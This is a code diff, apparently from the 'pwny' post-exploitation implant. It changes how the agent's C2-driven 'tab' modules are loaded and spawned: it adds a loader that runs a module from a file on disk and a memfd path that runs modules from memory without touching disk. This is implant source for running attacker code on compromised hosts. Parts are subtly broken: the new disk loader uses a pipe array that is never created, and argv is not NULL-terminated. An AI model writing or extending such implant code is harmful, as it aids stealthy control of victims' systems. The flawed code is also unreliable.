@@ -43,7 +43,36 @@
 
 #include <uthash/uthash.h>
 
-static int create_tab(tabs_t *tab, unsigned char *buffer, int size)
+static int create_tab_disk(tabs_t *tab, char *filename)
+{
+    int pipes[2];
+    char *argv[1];
+    pid_t pid;
+
+    pid = fork();
+
+    if (pid == -1)
+        return -1;
+    else if (pid == 0)
+    {
+        dup2(pipes[0], STDIN_FILENO);
+        argv[0] = "pwny";
+
+        execv(filename, argv);
+        exit(EXIT_SUCCESS);
+    }
+    else
+    {
+        fcntl(pipes[1], F_SETFL, O_NONBLOCK);
+
+        tab->fd = pipes[1];
+        tab->pid = pid;
+    }
+
+    return 0;
+}
+
+static int create_tab_buffer(tabs_t *tab, unsigned char *buffer, int size)
 {
     int pipes[2];
     char *argv[1];
@@ -69,14 +98,18 @@ static int create_tab(tabs_t *tab, unsigned char *buffer, int size)
     else if (pid == 0)
     {
         dup2(pipes[0], STDIN_FILENO);
-        argv[0] = "m4r1n4";
+        argv[0] = "pwny";
 
         #ifdef LINUX
-            pawn_exec(buffer, argv, environ);
+            #ifdef PAWN_MEMFD
+                pawn_exec_fd(buffer, argv, environ);
+            #else
+                pawn_exec(buffer, argv, environ);
+            #endif
         #else
-        #ifdef MACOS
-            pawn_exec_bundle(buffer, argv, environ);
-        #endif
+            #ifdef MACOS
+                pawn_exec_bundle(buffer, argv, environ);
+            #endif
         #endif
 
         free(frame);
@@ -124,7 +157,7 @@ tlv_pkt_t *tab_lookup(tabs_t **tabs, int id, c2_t *c2)
     return NULL;
 }
 
-int tab_add(tabs_t **tabs, int id, unsigned char *buffer, int size)
+int tab_add_disk(tabs_t **tabs, int id, char *filename)
 {
     tabs_t *tab;
     tabs_t *tab_new;
@@ -139,7 +172,38 @@ int tab_add(tabs_t **tabs, int id, unsigned char *buffer, int size)
         {
             tab_new->id = id;
 
-            if (create_tab(tab_new, buffer, size) < 0)
+            if (create_tab_disk(tab_new, filename) < 0)
+            {
+                free(tab_new);
+                return -1;
+            }
+
+            HASH_ADD_INT(*tabs, id, tab_new);
+            log_debug("* Added tab entry (%d)\n", id);
+
+            return 0;
+        }
+    }
+
+    return -1;
+}
+
+int tab_add_buffer(tabs_t **tabs, int id, unsigned char *buffer, int size)
+{
+    tabs_t *tab;
+    tabs_t *tab_new;
+
+    HASH_FIND_INT(*tabs, &id, tab);
+
+    if (tab == NULL)
+    {
+        tab_new = calloc(1, sizeof(*tab_new));
+
+        if (tab_new != NULL)
+        {
+            tab_new->id = id;
+
+            if (create_tab_buffer(tab_new, buffer, size) < 0)
             {
                 free(tab_new);
                 return -1;
@@ -169,12 +233,17 @@ int tab_exit(tabs_t *tab)
     if (tlv_pkt_write(tab->fd, tlv_pkt) < 0)
         goto fail;
 
+    log_debug("* Waiting for tab to shutdown (%d)\n", tab->id);
+
     do
     {
         pid = waitpid(tab->pid, &status, 0);
         if (pid == -1)
             break;
-    } while (!WIFEXITED(status) && !WIFSIGNALED(status));
+    }
+    while (!WIFEXITED(status) && !WIFSIGNALED(status));
+
+    log_debug("* Tab %d on PID %d shutdown\n", tab->id, tab->pid);
 
     close(tab->fd);
     return 0;
@@ -210,7 +279,8 @@ void tabs_free(tabs_t *tabs)
 
     for (tab = tabs; tab != NULL; tab = tab->hh.next)
     {
-        tab_exit(tab);
+        if (tab_exit(tab) < 0)
+            continue;
 
         log_debug("* Freed tab entry (%d)\n", tab->id);
         HASH_DEL(tabs, tab);
